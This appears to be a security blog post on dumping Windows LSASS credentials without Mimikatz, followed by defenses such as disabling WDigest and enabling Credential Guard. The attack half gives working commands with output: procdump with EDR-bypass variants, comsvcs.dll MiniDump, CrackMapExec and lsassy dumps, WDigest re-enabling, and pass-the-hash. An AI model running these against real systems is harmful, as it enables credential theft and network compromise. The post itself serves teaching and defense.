# Attacks & Defenses: Dumping LSASS With No Mimikatz
Mimikatz
--------

Mimikatz ([1](https://github.com/gentilkiwi/mimikatz)) is a big-name tool in penetration testing used to dump credentials from memory on Windows. As a penetration tester, this method is invaluable for lateral and vertical privilege escalation in Windows Active Directory environments and is used on nearly every internal penetration test. Because of its popularity, the Mimikatz executable and PowerShell script are detected by the majority of Antivirus (AV) solutions out there. This post will cover several alternative methods to achieve the same goal without the need for modifying Mimikatz to evade AV, as well as some methods for preventing and detecting this attack. 

Windows Authentication
----------------------

Windows and Active Directory authentication mechanisms are fairly complex and the details of their inner workings are beyond the scope of this post. However, the following topics are critical to understanding why tools such as Mimikatz are so effective and devastating to a company’s security when used by attackers or penetration testers:

### LSASS

Local Security Authority Subsystem Service (LSASS) is the process on Microsoft Windows that handles all user authentication, password changes, creation of access tokens, and enforcement of security policies. This means the process stores multiple forms of hashed passwords, and in some instances even stores plaintext user passwords.

### WDigest

WDigest authentication was used in older versions of Windows Server and stores plaintext passwords in memory. Because Microsoft focuses heavily on backward compatibility, this method of authentication is actually enabled by default on Windows operating systems prior to Windows 8 and Windows Server 2012 R2. Even worse, it is actually used as part of the process for domain authentication, meaning anytime a user on the network uses RDP to remote into a computer, SMB to authenticate to a file share, or physically enters their password into a console when WDigest is enabled, their plaintext credentials are stored in the memory space of the LSASS process and can be extracted by attackers.

While Windows 7 and Server 2008 are now out of extended support and _should_ be decommissioned where possible, many organizations still have a large percentage of their workstations and servers on these older versions of Windows operating systems. This makes them a prime target for Mimikatz-style LSASS dumping by attackers.

Necessary Conditions To Dump LSASS
----------------------------------

In order to dump LSASS as an attacker, it is necessary to have the SEDebugPrivilege. The default Windows setting is to grant this privilege to local administrators, but this can be verified by using the ‘whoami’ command:

```
whoami /priv
```


![this capture of code from the White Oak Security blog shows the whoami/priv and the dedebudprivledge controls are highlighted.](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/YBnwzH_jlpFsRhkgpF1R4svvnWUhVYdDv9DoOF-9CsvEUIpXB7Rh38rQ0fLxtieK3sEri2mCg6uRqCf8sak7ff9023anyce9M7n2oXHg59RVarjdDebwuD_AFzU7aBUZw4aCUqzZ=s0.png)

Secondly, it is important to note that on modern machines, Windows Defender will kill any PowerShell process that attempts to dump LSASS ([2](https://twitter.com/byt3bl33d3r/status/1161533880534523906)) so it is important to use CMD or .net tools for this rather than PowerShell. 

Below is a list of methods used to dump LSASS. Note that several of these methods create memory dump files rather than outputting the hashes/passwords. To process an LSASS memory dump file, Mimikatz or Pypykatz are two common tools used to extract credentials.

### Mimikatz to process LSASS memory dump file:

This is a good method to use if you do your primary testing from a Windows machine, otherwise, you have to copy the dump file over to a Windows machine to run Mimikatz. Make sure to create an exception folder for Windows Defender on the machine you are using Mimikatz on or Defender will quarantine your Mimikatz executable. Run Mimikatz and use the following commands to extract credentials from your LSASS Dump file:

```
sekurlsa::minidump lsass.DMP
log lsass.txt
sekurlsa::logonPasswords
```


![this capture of code from the White Oak Security blog shows the mimikatz_trunk code](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/d5BLAT8ovNFZ86-APRvDtEPNvdBSKqFCMNHh8KqBRpjRfbfZZWHHssdZzwbfJQvFp9xgwAY3TMTDxuCJk5vEnmXGT4l0W9chTjqzF8i1pV64PlkXdLqQefkR83XyJIlMX8seeO_8=s0.png)

### Pypykatz to process LSASS memory dump file:

If you do your primary testing from a Linux machine, Pypykatz ([3](https://github.com/skelsec/pypykatz)) is an excellent way to speed up the process of extracting credentials from a dump file as you don’t have to spin up a Windows VM and copy the dump file over for Mimikatz. Use the following command to extract credentials with Pypykatz:

```
pypykatz lsa minidump lsass.DMP 
```


Attacks
-------

Now that we have covered ways to process LSASS memory dump files, here are some ways to actually create those dump files from Windows machines.

Windows Signed Tools
--------------------

### Task Manager (GUI)

If you have Remote Desktop Protocol (RDP) or other GUI access to the device, you can use the Windows Task Manager to create a dump file. Windows Defender does not alert on this by default, making it a very reliable option. The downside to this method is it does not scale well and is relatively slow.

From the Task Manager, go to the “Details” tab, find lsass.exe, right-click, and select “Create dump file”:

![this capture of code from the White Oak Security blog shows the steps for From the Task Manager, go to the “Details” tab, find lsass.exe, right-click, and select “Create dump file”:](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/GeQgWAf0trT99bniXLqxNI69cxgMBN5cjCehg3sqIrC-dPJv7B2YjZoM1_EG9Qx_TBZHdOsc3-0DjwOHBxa2vuGN20Q40WNkS_5jlPWEMEZdoiIXGUbtQiC1EXFbdecUcqqXJHsv=s0.png)

This will create a dump file in the user’s AppData\\Local\\Temp directory:

![this capture shows a dump file in the user’s AppData\Local\Temp directory was successfully created](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/r9BTKvMn73JJw5DhqC6Ni4UKjUzNqiPLAkB-RTCqDtfuUDyuv0NFuO284wEeIktz0za2o-iUE1DtsDBW4PjuS3Ru3faFs89vwORefTKZgKv_vECZNbMKeb7QTKtKikmuNdVo-JVW=s0.png)

Now you need a way to get the dump file to your local machine. If using RDP from Linux, xfreerdp is an excellent choice as you can automatically mount a shared drive to copy files using the following syntax:

```
xfreerdp /v:IPADDRESS /u:USERNAME /p:PASSWORD /d:DOMAIN /drive:SHARE,/path/shared 
```


This will create a shared drive name “SHARE” on the Windows machine you are accessing remotely:

![this capture of code from the White Oak Security blog shows that a folder called SHARE on Red is highlighted with the lsass dump file.](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/p2tXrp_cFR-WXVj6J9_bp-1ml13OUOifp2Wz5_xOAB7-8e0LWgZorf69BsLnBLiJLXoFmtk-je49YtpTXo0HFSjl0K_VLguGoNe0RgtIhrIu1l1B_0t_Fv1vc4u7OBCntvVTpzl2=s0.png)

You can then use Pypykatz to extract any stored credentials and hashes from the dump file:

![this capture of code from the White Oak Security blog shows that from pypykatz to extract the credentials](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/DAHhjWKSEauC0rNR8ZyEJ4u_NVvn80dixYms93-7JdSAFoYjrH-YS_Pf2zGiNHqNO_KffCBCdfnI30uXrmCwW655LX7WdEUkcSfpbW2Y1xs13SWgaKnIWqaeqGW9K2nB3cJBJZxs=s0.png)

### Procdump

Procdump ([4](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)) is a Windows SysInternals tool that can be used to create memory dumps of processes. The downside to this method is you have to copy the Procdump executable to the target machine, and some organizations alert the binary as being malicious. This method is also slow and doesn’t scale too well.

The syntax for creating a memory dump of LSASS is:

```
procdump.exe -accepteula -ma lsass.exe out.dmp
```


Some EDR solutions will alert or block this based on the “lsass” process name. This can usually be bypassed by specifying the LSASS process ID instead. 

To get LSASS process ID via PowerShell:

```
PS C:\Users\testadmin> get-process lsass
 
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1296      26     7148      51752               580   0 lsass
```


To get LSASS process ID via CMD:

```
PS C:\Users\test> tasklist | findstr lsass
lsass.exe                      580 Services                   0     51,752 K
```


Then use the same procdump syntax:

```
procdump.exe -accepteula -ma 580 out.dmp
```


Additionally, depending on the EDR, it may be sufficient to simply add quotations around the process name (This bypasses Cortex XDR for example):

```
procdump.exe -accepteula -ma “lsass.exe” out.dmp
```


#### Comsvcs

This method is interesting because it uses native libraries present on all Windows machines:

```
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\temp\out.dmp full
```


However, Windows Defender will alert on and remove the dump file:

![this screenshot from the White Oak Security blog shows that Windows Defender alerted us about the dump file](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/2FeG9J6_tq4Yh3ECkG5BWXGG8w8fqWV4ajy5ue1cyUawK3Ry3bGBYpWumbvQuIydGsmxBzvSuhmO-ZBNUbskgcXKRvBLhrinjlWOor0cU-MkS2CwyIIIOhomYop2pZbWyl76yeAW=s0.png)

### Crackmapexec

Crackmapexec ([5](https://github.com/byt3bl33d3r/CrackMapExec)) is an excellent tool to remotely perform a dump of LSASS. This method is my preferred method for dumping LSASS on an internal penetration test. It scales really well as you can simply point and shoot at a whole subnet or list of IP addresses with credentials that have local admin access:

```
crackmapexec smb 192.168.0.76 -u testadmin -p Password123 --lsa
SMB         192.168.0.76    445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:test.lab) (signing:True) (SMBv1:True)
SMB         192.168.0.76    445    DC               [+] test.lab\testadmin:Password123 (Pwn3d!)
SMB         192.168.0.76    445    DC               [+] Dumping LSA secrets
SMB         192.168.0.76    445    DC               TEST\DC$:aes256-cts-hmac-sha1-96:5a0f8706487aae9bf38161a4608e7567ac1c4a105226b783ccbd98274c8d4018
SMB         192.168.0.76    445    DC               TEST\DC$:aes128-cts-hmac-sha1-96:d8402dda8272520b01ba6b8dcfd9b3d8
SMB         192.168.0.76    445    DC               TEST\DC$:des-cbc-md5:f45b2361ae1ad308
SMB         192.168.0.76    445    DC               TEST\DC$:plain_password_hex:4e4545a05fe307150e0679cf4169caea359467422908fec7e82b6eb63d23dfa9cb180c4c3da62ff7ce1ab1396b1fa505300bed8d7a67e36b74ab9b25721756181c47850cf9dc220964ae7c50a104cfed776f5c1cb8865bb443d9d757cd90dc1dca063ba89776825f20d7d61b7debfb5339cd69dc3c3c81b0e81c6b74065d4456a6339991fd05a5e687cd8fd0f81562a3613f7094015ab82ca0e16fca01551fdef5f397f48664cb64801215b453d29c1034aca75242c3be6aa080dd6be94ca91f712db8c6d4ca6305ee47912fa5a11bc388388fde380c3d9a712d6c8fe36b50c3cdedc4cae98d75eb9561c0a8ec13a0da
SMB         192.168.0.76    445    DC               TEST\DC$:aad3b435b51404eeaad3b435b51404ee:6e93dbc1944a24129c85324692f4687b:::
SMB         192.168.0.76    445    DC               dpapi_machinekey:0x974d7e0eab71f962c006ae631a67883cb65fbb8e
dpapi_userkey:0xcc3bd3a27097b37446adc6e7dc5023a3316e3a3e
SMB         192.168.0.76    445    DC               NL$KM:b4d3d7354eec7c5d18ca62845d33e65cdaf826db03b4bf401f2c3864fd56d271f908f8eefbf0d278675be217810199c6ce158550484b62fd6a280564bf305814
SMB         192.168.0.76    445    DC               [+] Dumped 7 LSA secrets to /home/t/.cme/logs/DC_192.168.0.76_2021-07-22_122314.secrets and /home/t/.cme/logs/DC_192.168.0.76_2021-07-22_122314.cached

```


Notice that this stores the dumped hashes and plaintext passwords to your home directory under ~/.cme/logs/.

This makes retrieval easy when you have dumped LSASS on numerous machines. CrackMapExec uses Impacket’s ([6](https://github.com/SecureAuthCorp/impacket)) secretsdump.py under the hood to dump LSASS. 

### Lsassy

Lsassy ([7](https://github.com/Hackndo/lsassy)) is an interesting tool that uses a combination of the above methods to remotely dump LSASS. The default command attempts to use the comsvcs.dll method to dump LSASS via WMI or a remote scheduled task:

```
└─$ lsassy -d test.lab -u testadmin -p Password123 192.168.0.76
[+] [192.168.0.76] TEST\testadmin  58a478135a93ac3bf058a5ea0e8fdb71[+] [192.168.0.76] TEST\testadmin  Password123
```


Additionally, Lsassy has been integrated into Crackmapexec, giving you a nice clean output of just NTLM hashes or plaintext credentials. The downside to this method as opposed to the “–lsa” method is that it does not automatically store the results in the Crackmapexec logs directory.

```
└─$ crackmapexec smb 192.168.0.76 -u testadmin -p Password123 -M lsassy
SMB         192.168.0.76    445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:test.lab) (signing:True) (SMBv1:True)
SMB         192.168.0.76    445    DC               [+] test.lab\testadmin:Password123 (Pwn3d!)
LSASSY      192.168.0.76    445    DC               TEST\testadmin 58a478135a93ac3bf058a5ea0e8fdb71
LSASSY      192.168.0.76    445    DC               TEST\testadmin Password123
```


Enabling WDigest On Newer Machines
----------------------------------

While WDigest is disabled on newer machines, it is possible for attackers to enable it so plaintext credentials once a user logs in. WDigest can be enabled by setting the necessary registry key to “1” instead of “0”: 

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1
```


Note that as a penetration tester, this is opening up a security hole and may not be in the best interest of your client depending on their business needs. To disable WDigest again, set the registry key back to “0”:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 0
```


Additionally, this can be done remotely with Crackmapexec:

```
└─$ crackmapexec smb 192.168.0.76 -u testadmin -p Password123 -M wdigest -o action=enable
SMB         192.168.0.76    445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:test.lab) (signing:True) (SMBv1:True)
SMB         192.168.0.76    445    DC               [+] test.lab\testadmin:Password123 (Pwn3d!)
WDIGEST     192.168.0.76    445    DC               [+] UseLogonCredential registry key created successfully
```


Oftentimes, it is unnecessary to enable WDigest except in very targeted attacks, as Pass-the-Hash is still alive and well. CrackMapExec makes using NTLM hashes for lateral movement very easy by using the “-H” flag:

```
└─$ crackmapexec smb 192.168.0.76 -u testadmin -H 58a478135a93ac3bf058a5ea0e8fdb71
SMB         192.168.0.76    445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:test.lab) (signing:True) (SMBv1:True)
SMB         192.168.0.76    445    DC               [+] test.lab\testadmin 58a478135a93ac3bf058a5ea0e8fdb71 (Pwn3d!)
```


Defenses
--------

What is the best way to defend against this attack? As demonstrated above, using an EDR with signature-based detections to block Mimikatz is inadequate. There are a few things your organization can do to help prevent these attacks. Ideally, all end-of-life Windows operating systems should be decommissioned and upgraded to currently supported operating systems. Newer Windows operating systems disable WDigest by default, helping protect against the dumping of plaintext passwords using these methods. However, this is not always possible for some organizations, and attackers can still use the above methods to dump NTLM hashes which can then be cracked or used in pass-the-hash attacks to perform lateral movement. Another important defense is to restrict local administrative access as much as possible. Besides these two general rules, the following are some methods that can be used to prevent and detect these attacks. 

**Summary of Best Defenses:**
-----------------------------

*   Decommission all end-of-life Windows operating systems if possible
*   Restrict local administrative access as much as possible
*   Disable WDigest on all Windows operating systems prior to Windows 8 and Windows Server 2012 R2
*   Enable Windows Defender Credential Guard
*   Monitor for registry changes to ensure WDigest is not reenabled and that Windows Defender Credential Guard is not disabled
*   Alert on and restrict pass-the-hash if possible

\*Disclaimer: These changes should be tested thoroughly in your environment to ensure they will not cause any negative impact.

Disabling WDigest
-----------------

First and foremost, if you have any outdated Windows operating systems (prior to Windows 8 and Windows Server 2012 R2), WDigest is enabled by default on these devices and should be disabled via Group Policy. This can be done by installing Windows patch **KB 2871997** and setting the following registry key to 0:

```
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
```


Additionally, this registry key should be added to your monitoring solution and trigger high-severity alerts if the registry key is set to “1” or enabled anywhere in your environment.

Disabling SEDebugPrivilege For Local Administrators
---------------------------------------------------

Because SEDebugPrivilege is required to dump LSASS memory, disabling it for local administrators would ideally make it impossible to perform this attack. However, a local administrator can trivially grant themselves this permission again, making this technique relatively useless for preventing the dumping of LSASS memory. ([8](https://docs.microsoft.com/en-us/troubleshoot/sql/install/installation-fails-if-remove-user-right)) While it can be bypassed easily, this technique may be useful for some organizations as an additional layer to a defense-in-depth strategy to help prevent automated attacks. 

Signature-Based Detection & Alerting
------------------------------------

Besides alerting on WDigest being enabled, many EDR solutions will alert on the creation of dump files based on common names (i.e. Elastic alerts on the following names: “lsass\*.dmp”, “dumpert.dmp”, “Andrew.dmp”, “SQLDmpr\*.mdmp”, “Coredump.dmp”) ([9](https://www.elastic.co/guide/en/security/current/lsass-memory-dump-creation.html)). Additionally, the Procdump executable is flagged as malicious by some EDR solutions as well, forcing attackers to use other methods of dumping.

While these types of detections are easily bypassed by changing the name of the dump file or using tools other than procdump, they can be useful as part of a defense in depth strategy to catch lazy attackers or malware using off-the-shelf tools with default settings. 

Disabling Pass-The-Hash
-----------------------

If an organization disables WDigest and creates alerting on WDigest being re-enabled, this forces an attacker to crack NTLM hashes or use pass-the-hash techniques. Disabling and/or alerting on pass-the-hash techniques then makes LSASS dumping attacks far less effective, as it reduces the attack surface of LSASS dumping to the ability to crack dumped NTLM credentials. Disabling/preventing pass-the-hash techniques is a complex topic and will not be covered in depth by this post. For further information, check out [these white papers.](https://www.microsoft.com/pth)

Windows Defender Credential Guard
---------------------------------

On Windows 10 Enterprise/Pro, Windows Server 2016, and Windows Server 2019, Windows Defender Credential guard can be used to add additional protections to the LSASS process. This technology runs LSASS in a virtualized container that prevents access to all users, even those with SYSTEM privileges. This effectively makes it impossible to dump LSASS using any of the above methods and should be seen as the gold standard for preventing this type of attack and lateral movement. A privileged user has the ability to disable Credential Guard (10), which means they would have access to hashes from future logins. However, this does not allow them access to the hashes already present in LSASS.

See the following link for additional information regarding enabling and using Credential Guard: [https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)

CONCLUSION
----------

Dumping credentials from LSASS for lateral movement is a tactic that is alive and well today. On internal penetration tests, we often see environments with numerous older Windows devices with WDigest still enabled, making this tactic even more dangerous. Oftentimes, once local administrative access is achieved on a single host, dumping LSASS allows for a chain of lateral movement, where one set of credentials is compromised that then has local admin access to another host, where additional credentials are stored in memory that has local admin elsewhere. Eventually, this usually leads to compromise of Domain Administrator account, and then it’s game over. This is why prevention and detection of these methods are vital for System Administrators as defenders. 


#### **Sources**:

1.  [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
2.  [https://twitter.com/byt3bl33d3r/status/1161533880534523906](https://twitter.com/byt3bl33d3r/status/1161533880534523906)
3.  [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)
4.  [https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
5.  [https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
6.  [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
7.  [https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)
8.  [https://docs.microsoft.com/en-us/troubleshoot/sql/install/installation-fails-if-remove-user-right](https://docs.microsoft.com/en-us/troubleshoot/sql/install/installation-fails-if-remove-user-right)
9.  [https://www.elastic.co/guide/en/security/current/lsass-memory-dump-creation.html](https://www.elastic.co/guide/en/security/current/lsass-memory-dump-creation.html)
10.  [https://teamhydra.blog/2020/08/25/bypassing-credential-guard/](https://teamhydra.blog/2020/08/25/bypassing-credential-guard/)
